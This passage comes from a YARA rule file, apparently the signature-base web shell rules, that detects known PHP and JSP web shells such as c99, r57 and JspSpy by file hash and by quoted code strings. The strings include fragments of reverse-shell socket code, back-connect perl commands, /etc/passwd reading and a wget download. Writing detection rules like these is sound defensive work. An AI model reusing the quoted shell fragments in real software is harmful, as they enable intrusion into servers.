		hash0 = "791708057d8b429d91357d38edf43cc0"
		hash1 = "40a1f840111996ff7200d18968e42cfe"
		hash2 = "e0202adff532b28ef1ba206cf95962f2"
		hash3 = "802f5cae46d394b297482fd0c27cb2fc"

	strings:
		$s5 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname."

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_C99_Shell_Ci_Biz_Was_Here_C100_V_Xxx {
    meta:
		description = "Web Shell"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2508-L2527"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "ccc3cb553f7b5d089a43612d48522cc4a66b4a8ab433321ae1a716a8fa57b62c"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "61a92ce63369e2fa4919ef0ff7c51167"
		hash1 = "f2fa878de03732fbf5c86d656467ff50"
		hash2 = "27786d1e0b1046a1a7f67ee41c64bf4c"
		hash3 = "0f5b9238d281bc6ac13406bb24ac2a5b"
		hash4 = "68c0629d08b1664f5bcce7d7f5f71d22"
		hash5 = "048ccc01b873b40d57ce25a4c56ea717"

	strings:
		$s8 = "else {echo \"Running datapipe... ok! Connect to <b>\".getenv(\"SERVER_ADDR\""

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_2008_2009Lite_2009Mssql {
    meta:
		description = "Web Shell - from files 2008.php, 2009lite.php, 2009mssql.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2528-L2545"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "ae33048856440e25972aa5483b60e775f50f60a9ef5e77a58edd60eacdcd9ee3"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "3e4ba470d4c38765e4b16ed930facf2c"
		hash1 = "3f4d454d27ecc0013e783ed921eeecde"
		hash2 = "aa17b71bb93c6789911bd1c9df834ff9"

	strings:
		$s0 = "<a href=\"javascript:godir(\\''.$drive->Path.'/\\');"
		$s7 = "p('<h2>File Manager - Current disk free '.sizecount($free).' of '.sizecount($all"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Shell_Phpspy_2005_Full_Phpspy_2005_Lite_Phpspy_2006_Arabicspy_PHPSPY_Hkrkoz {
    meta:
		description = "Web Shell"
		author = "Florian Roth (Nextron Systems)"
		id = "41a0560a-b22e-5028-8ad1-710c5758cb1d"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2546-L2567"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "5da06481cf789e71969a5b54a33bfab41e08a1961cc056604a696203fef48422"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "791708057d8b429d91357d38edf43cc0"
		hash1 = "b68bfafc6059fd26732fa07fb6f7f640"
		hash2 = "42f211cec8032eb0881e87ebdb3d7224"
		hash3 = "40a1f840111996ff7200d18968e42cfe"
		hash4 = "e0202adff532b28ef1ba206cf95962f2"
		hash5 = "0712e3dc262b4e1f98ed25760b206836"
		hash6 = "802f5cae46d394b297482fd0c27cb2fc"

	strings:
		$s0 = "$mainpath_info           = explode('/', $mainpath);" fullword
		$s6 = "if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == \"d"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_807_Dm_Jspspyjdk5_M_Cofigrue {
    meta:
		description = "Web Shell - from files 807.jsp, dm.jsp, JspSpyJDK5.jsp, m.jsp, cofigrue.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2568-L2587"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "0fc7ac740e147bd3703dac74743b19148aa7bb359cc5f347acf3b0dbe26bf752"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
		hash1 = "14e9688c86b454ed48171a9d4f48ace8"
		hash2 = "341298482cf90febebb8616426080d1d"
		hash3 = "88fc87e7c58249a398efd5ceae636073"
		hash4 = "349ec229e3f8eda0f9eb918c74a8bf4c"

	strings:
		$s1 = "url_con.setRequestProperty(\"REFERER\", \"\"+fckal+\"\");" fullword
		$s9 = "FileLocalUpload(uc(dx())+sxm,request.getRequestURL().toString(),  \"GBK\");" fullword

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Dive_Shell_1_0_Emperor_Hacking_Team_Xxx {
    meta:
		description = "Web Shell"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2588-L2605"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "8bf11041a16060fa32431adfe33727863355bae7fec2cf841dcc919092db5c80"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "1b5102bdc41a7bc439eea8f0010310a5"
		hash1 = "f8a6d5306fb37414c5c772315a27832f"
		hash2 = "37cb1db26b1b0161a4bf678a6b4565bd"

	strings:
		$s1 = "if (($i = array_search($_REQUEST['command'], $_SESSION['history'])) !== fals"
		$s9 = "if (ereg('^[[:blank:]]*cd[[:blank:]]*$', $_REQUEST['command'])) {" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_404_Data_In_Jfolder_Jfolder01_Xxx {
    meta:
		description = "Web Shell"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2606-L2628"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "171b811c1b93f99f3070692a91a0462f80d9d52ecf26d7fb7297a8bdd9a4c014"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "7066f4469c3ec20f4890535b5f299122"
		hash1 = "9f54aa7b43797be9bab7d094f238b4ff"
		hash2 = "793b3d0a740dbf355df3e6f68b8217a4"
		hash3 = "8979594423b68489024447474d113894"
		hash4 = "ec482fc969d182e5440521c913bab9bd"
		hash5 = "f98d2b33cd777e160d1489afed96de39"
		hash6 = "4b4c12b3002fad88ca6346a873855209"
		hash7 = "c93d5bdf5cf62fe22e299d0f2b865ea7"
		hash8 = "e9a5280f77537e23da2545306f6a19ad"

	strings:
		$s4 = "&nbsp;<TEXTAREA NAME=\"cqq\" ROWS=\"20\" COLS=\"100%\"><%=sbCmd.toString()%></TE"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Jsp_Reverse_Jsp_Reverse_Jspbd {
    meta:
		description = "Web Shell - from files jsp-reverse.jsp, jsp-reverse.jsp, jspbd.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2629-L2647"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "cd7409bb6ace3044f3d0bf380133c4fe4a7c0c0309f9d800b397439aa95f81fc"
		score = 50
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "8b0e6779f25a17f0ffb3df14122ba594"
		hash1 = "ea87f0c1f0535610becadf5a98aca2fc"
		hash2 = "7d5e9732766cf5b8edca9b7ae2b6028f"

	strings:
		$s0 = "osw = new BufferedWriter(new OutputStreamWriter(os));" fullword
		$s7 = "sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());" fullword
		$s9 = "isr = new BufferedReader(new InputStreamReader(is));" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_400_In_Jfolder_Jfolder01_Jsp_Leo_Warn_Webshell_Nc {
    meta:
		description = "Web Shell - from files 400.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, warn.jsp, webshell-nc.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2648-L2672"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "74e31e51f2cb46a042e8591ffb44fe68fb591d202c8171c6afb556eddb381f6f"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "36331f2c81bad763528d0ae00edf55be"
		hash1 = "793b3d0a740dbf355df3e6f68b8217a4"
		hash2 = "8979594423b68489024447474d113894"
		hash3 = "ec482fc969d182e5440521c913bab9bd"
		hash4 = "f98d2b33cd777e160d1489afed96de39"
		hash5 = "4b4c12b3002fad88ca6346a873855209"
		hash6 = "e9a5280f77537e23da2545306f6a19ad"
		hash7 = "598eef7544935cf2139d1eada4375bb5"

	strings:
		$s0 = "sbFolder.append(\"<tr><td >&nbsp;</td><td>\");" fullword
		$s1 = "return filesize / intDivisor + \".\" + strAfterComma + \" \" + strUnit;" fullword
		$s5 = "FileInfo fi = (FileInfo) ht.get(\"cqqUploadFile\");" fullword
		$s6 = "<input type=\"hidden\" name=\"cmd\" value=\"<%=strCmd%>\">" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_2_520_Job_Jspwebshell_1_2_Ma1_Ma4_2 {
    meta:
		description = "Web Shell - from files 2.jsp, 520.jsp, job.jsp, JspWebshell 1.2.jsp, ma1.jsp, ma4.jsp, 2.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2673-L2695"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "49614b2a42210fa134f85fa52c66e12809f2bb9eaf56c17b69d21e5fbfc8888b"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "64a3bf9142b045b9062b204db39d4d57"
		hash1 = "9abd397c6498c41967b4dd327cf8b55a"
		hash2 = "56c005690da2558690c4aa305a31ad37"
		hash3 = "70a0ee2624e5bbe5525ccadc467519f6"
		hash4 = "532b93e02cddfbb548ce5938fe2f5559"
		hash5 = "6e0fa491d620d4af4b67bae9162844ae"
		hash6 = "7eabe0f60975c0c73d625b7ddf7b9cbd"

	strings:
		$s1 = "while ((nRet = insReader.read(tmpBuffer, 0, 1024)) != -1) {" fullword
		$s6 = "password = (String)session.getAttribute(\"password\");" fullword
		$s7 = "insReader = new InputStreamReader(proc.getInputStream(), Charset.forName(\"GB231"

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Shell_2008_2009Mssql_Phpspy_2005_Full_Phpspy_2006_Arabicspy_Hkrkoz {
    meta:
		description = "Web Shell"
		author = "Florian Roth (Nextron Systems)"
		id = "41a0560a-b22e-5028-8ad1-710c5758cb1d"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2696-L2720"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "140af92ab61059649a872bef96b916f2c402fd9891301d4a1ba1f389a45af003"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "791708057d8b429d91357d38edf43cc0"
		hash1 = "3e4ba470d4c38765e4b16ed930facf2c"
		hash2 = "aa17b71bb93c6789911bd1c9df834ff9"
		hash3 = "b68bfafc6059fd26732fa07fb6f7f640"
		hash4 = "40a1f840111996ff7200d18968e42cfe"
		hash5 = "e0202adff532b28ef1ba206cf95962f2"
		hash6 = "802f5cae46d394b297482fd0c27cb2fc"

	strings:
		$s0 = "$tabledump .= \"'\".mysql_escape_string($row[$fieldcounter]).\"'\";" fullword
		$s5 = "while(list($kname, $columns) = @each($index)) {" fullword
		$s6 = "$tabledump = \"DROP TABLE IF EXISTS $table;\\n\";" fullword
		$s9 = "$tabledump .= \"   PRIMARY KEY ($colnames)\";" fullword
		$fn = "filename: backup"

	condition:
		2 of ($s*) and not $fn
}
rule SIGNATURE_BASE_Webshell_Gfs_Sh_R57Shell_R57Shell127_Sniper_SA_Xxx {
    meta:
		description = "Web Shell"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2721-L2746"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "24d93f9ae5e174873a32abdf8dca6c00f03cbb4c5e2ad531ac7fa34f8fc90794"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "a2516ac6ee41a7cf931cbaef1134a9e4"
		hash1 = "ef43fef943e9df90ddb6257950b3538f"
		hash2 = "ae025c886fbe7f9ed159f49593674832"
		hash3 = "911195a9b7c010f61b66439d9048f400"
		hash4 = "697dae78c040150daff7db751fc0c03c"
		hash5 = "513b7be8bd0595c377283a7c87b44b2e"
		hash6 = "1d912c55b96e2efe8ca873d6040e3b30"
		hash7 = "e5b2131dd1db0dbdb43b53c5ce99016a"
		hash8 = "4108f28a9792b50d95f95b9e5314fa1e"
		hash9 = "41af6fd253648885c7ad2ed524e0692d"
		hash10 = "6fcc283470465eed4870bcc3e2d7f14d"

	strings:
		$s0 = "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuI"
		$s11 = "Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KIC"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Itsec_Phpjackal_Itsecteam_Shell_Jhn {
    meta:
		description = "Web Shell - from files itsec.php, PHPJackal.php, itsecteam_shell.php, jHn.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2747-L2766"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "0c97731c28f59a6fbab2b7882fae171da8d71add73ec92ab6093dec57fcd7207"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "8ae9d2b50dc382f0571cd7492f079836"
		hash1 = "e2830d3286001d1455479849aacbbb38"
		hash2 = "bd6d3b2763c705a01cc2b3f105a25fa4"
		hash3 = "40c6ecf77253e805ace85f119fe1cebb"

	strings:
		$s0 = "$link=pg_connect(\"host=$host dbname=$db user=$user password=$pass\");" fullword
		$s6 = "while($data=ocifetchinto($stm,$data,OCI_ASSOC+OCI_RETURN_NULLS))$res.=implode('|"
		$s9 = "while($data=pg_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+"

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Shell_Ci_Biz_Was_Here_C100_V_Xxx {
    meta:
		description = "Web Shell"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2767-L2787"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "a7841dec442877648a589045849f7f1b80316a30dda5a44ccc4bb626dbd2cdea"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "f2fa878de03732fbf5c86d656467ff50"
		hash1 = "27786d1e0b1046a1a7f67ee41c64bf4c"
		hash2 = "68c0629d08b1664f5bcce7d7f5f71d22"

	strings:
		$s2 = "if ($data{0} == \"\\x99\" and $data{1} == \"\\x01\") {return \"Error: \".$stri"
		$s3 = "<OPTION VALUE=\"find /etc/ -type f -perm -o+w 2> /dev/null\""
		$s4 = "<OPTION VALUE=\"cat /proc/version /proc/cpuinfo\">CPUINFO" fullword
		$s7 = "<OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/de"
		$s9 = "<OPTION VALUE=\"cut -d: -f1,2,3 /etc/passwd | grep ::\">USER"

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_NIX_REMOTE_WEB_SHELL_NIX_REMOTE_WEB_Xxx1 {
    meta:
		description = "Web Shell"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2788-L2807"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "95d25e9dc75a9af91e23b8c53acb384616f5d8a78605200bdb94f016a7f160f6"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "0b19e9de790cd2f4325f8c24b22af540"
		hash1 = "f3ca29b7999643507081caab926e2e74"
		hash2 = "527cf81f9272919bf872007e21c4bdda"

	strings:
		$s1 = "<td><input size=\"48\" value=\"$docr/\" name=\"path\" type=\"text\"><input type="
		$s2 = "$uploadfile = $_POST['path'].$_FILES['file']['name'];" fullword
		$s6 = "elseif (!empty($_POST['ac'])) {$ac = $_POST['ac'];}" fullword
		$s7 = "if ($_POST['path']==\"\"){$uploadfile = $_FILES['file']['name'];}" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_C99_C99Shell_C99_W4Cking_Shell_Xxx {
    meta:
		description = "Web Shell"
		author = "Florian Roth (Nextron Systems)"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2808-L2836"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "731bbf06208d20874c1d8464472e6a66a2e9b0bc2dc0475783763b99eb70fefa"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "61a92ce63369e2fa4919ef0ff7c51167"
		hash1 = "d3f38a6dc54a73d304932d9227a739ec"
		hash2 = "9c34adbc8fd8d908cbb341734830f971"
		hash3 = "f2fa878de03732fbf5c86d656467ff50"
		hash4 = "b8f261a3cdf23398d573aaf55eaf63b5"
		hash5 = "27786d1e0b1046a1a7f67ee41c64bf4c"
		hash6 = "0f5b9238d281bc6ac13406bb24ac2a5b"
		hash7 = "68c0629d08b1664f5bcce7d7f5f71d22"
		hash8 = "157b4ac3c7ba3a36e546e81e9279eab5"
		hash9 = "048ccc01b873b40d57ce25a4c56ea717"

	strings:
		$s0 = "echo \"<b>HEXDUMP:</b><nobr>"
		$s4 = "if ($filestealth) {$stat = stat($d.$f);}" fullword
		$s5 = "while ($row = mysql_fetch_array($result, MYSQL_NUM)) { echo \"<tr><td>\".$r"
		$s6 = "if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo \"DB "
		$s8 = "echo \"<center><b>Server-status variables:</b><br><br>\";" fullword
		$s9 = "echo \"<textarea cols=80 rows=10>\".htmlspecialchars($encoded).\"</textarea>"

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_2008_2009Mssql_Phpspy_2005_Full_Phpspy_2006_Arabicspy_Hkrkoz {
    meta:
		description = "Web Shell"
		author = "Florian Roth (Nextron Systems)"
		id = "41a0560a-b22e-5028-8ad1-710c5758cb1d"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2837-L2859"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "2d78db4d45a35d6a78d4288e00a382a0937e3806f0570bd353b88955664a47f6"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "3e4ba470d4c38765e4b16ed930facf2c"
		hash1 = "aa17b71bb93c6789911bd1c9df834ff9"
		hash2 = "b68bfafc6059fd26732fa07fb6f7f640"
		hash3 = "40a1f840111996ff7200d18968e42cfe"
		hash4 = "e0202adff532b28ef1ba206cf95962f2"
		hash5 = "802f5cae46d394b297482fd0c27cb2fc"

	strings:
		$s0 = "$this -> addFile($content, $filename);" fullword
		$s3 = "function addFile($data, $name, $time = 0) {" fullword
		$s8 = "function unix2DosTime($unixtime = 0) {" fullword
		$s9 = "foreach($filelist as $filename){" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_C99_C66_C99_Shadows_Mod_C99Shell {
    meta:
		description = "Web Shell - from files c99.php, c66.php, c99-shadows-mod.php, c99shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2860-L2882"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "b50a6124f25bbb6fcc9d16d1de26d833a4b968db8e8033e76f3a74695577017e"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "61a92ce63369e2fa4919ef0ff7c51167"
		hash1 = "0f5b9238d281bc6ac13406bb24ac2a5b"
		hash2 = "68c0629d08b1664f5bcce7d7f5f71d22"
		hash3 = "048ccc01b873b40d57ce25a4c56ea717"

	strings:
		$s2 = "  if (unlink(_FILE_)) {@ob_clean(); echo \"Thanks for using c99shell v.\".$shv"
		$s3 = "  \"c99sh_backconn.pl\"=>array(\"Using PERL\",\"perl %path %host %port\")," fullword
		$s4 = "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#66"
		$s7 = "   elseif (!$data = c99getsource($bind[\"src\"])) {echo \"Can't download sources"
		$s8 = "  \"c99sh_datapipe.pl\"=>array(\"Using PERL\",\"perl %path %localport %remotehos"
		$s9 = "   elseif (!$data = c99getsource($bc[\"src\"])) {echo \"Can't download sources!"

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_He1P_Jspspy_Nogfw_Ok_Style_1_Jspspy1 {
    meta:
		description = "Web Shell - from files he1p.jsp, JspSpy.jsp, nogfw.jsp, ok.jsp, style.jsp, 1.jsp, JspSpy.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2883-L2906"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "522ba5f797e33c27fef3ae8d89889c31799073ed3c770a49401f4d42ead04640"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "b330a6c2d49124ef0729539761d6ef0b"
		hash1 = "d71716df5042880ef84427acee8b121e"
		hash2 = "344f9073576a066142b2023629539ebd"
		hash3 = "32dea47d9c13f9000c4c807561341bee"
		hash4 = "b9744f6876919c46a29ea05b1d95b1c3"
		hash5 = "3ea688e3439a1f56b16694667938316d"
		hash6 = "2434a7a07cb47ce25b41d30bc291cacc"

	strings:
		$s0 = "\"\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>\"+" fullword
		$s4 = "out.println(\"<h2>File Manager - Current disk &quot;\"+(cr.indexOf(\"/\") == 0?"
		$s7 = "String execute = f.canExecute() ? \"checked=\\\"checked\\\"\" : \"\";" fullword
		$s8 = "\"<td nowrap>\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>"

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_000_403_C5_Config_Myxx_Querydong_Spyjsp2010_Zend {
    meta:
		description = "Web Shell - from files 000.jsp, 403.jsp, c5.jsp, config.jsp, myxx.jsp, queryDong.jsp, spyjsp2010.jsp, zend.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2907-L2930"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "7ca710973592718c5455508c5798b3c51dce994d5ebd33aa3a59d1b03c096bdf"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
